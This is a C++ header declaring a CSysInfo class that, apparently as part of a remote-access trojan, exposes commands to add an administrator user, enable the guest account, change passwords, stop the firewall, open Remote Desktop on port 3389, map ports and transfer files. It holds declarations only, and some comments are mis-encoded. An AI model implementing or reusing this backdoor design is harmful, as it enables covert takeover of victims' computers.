// SysInfo.h: interface for the CSysInfo class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SYSINFO_H__F258B531_B1EF_4700_8AE7_4545927A5EA8__INCLUDED_)
#define AFX_SYSINFO_H__F258B531_B1EF_4700_8AE7_4545927A5EA8__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "../Manager.h"
#include "ZXPortMap.h"
#include <ClientSocket.h>

class CClientSocket;

class CSysInfo : public CManager
{
public:
    void OnReceive(LPBYTE lpBuffer, UINT nSize);
    DWORD ChangePort(LPVOID lparam);
    DWORD StopFire();
    void AddAdminUser();
    void DeleteUser();
    BOOL OpenGuest();
    void ChangeUserPass();
    BOOL DelUserName(char *user);
    BOOL DelSidName(char *sid);
    void Close3389();
    DWORD Open3389(LPVOID lparam);
    CZXPortMap cPortMap;
    DWORD nCtrlPort, nPort;
    TCHAR m_strCurrentProcessFileNames[MAX_PATH]; // ��ǰ���ڴ�����ļ�
    __int64 m_nCurrentProcessFileLength; // ��ǰ���ڴ�����ļ��ĳ���
    void	WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
    void	CreateLocalRecvFile(LPBYTE lpBuffer);
    void	GetFileData();
    void	GetOpenFile();
    static DWORD WINAPI PortMap(LPVOID lparam);
    void SendSysInfo();
//	void SendInstallInfo();
    LPBYTE getWtsmList();
    LPBYTE getSList();
    void SendWtsmList();
    void SendSList();
    char* GetTSClientName(DWORD sessionID);
    const char* GetTSClientProtocolType(DWORD sessionID);
    void  GetSystemInfo(tagSystemInfo1* pSysInfo);
//	void  GetOnlineInfo(tagOnlineInfo1* pInsInfo);
    void  WtsLoGoff(LPBYTE lpBuffer, UINT nSize);
    void  WtsDisc(LPBYTE lpBuffer, UINT nSize);
    void SendNetstart(LPBYTE lpBuffer, UINT nSize, UINT User_kt);   //�ʻ����� ֹͣ
    CSysInfo(CClientSocket *pClient);
    virtual ~CSysInfo();
};

#endif // !defined(AFX_SYSINFO_H__F258B531_B1EF_4700_8AE7_4545927A5EA8__INCLUDED_)
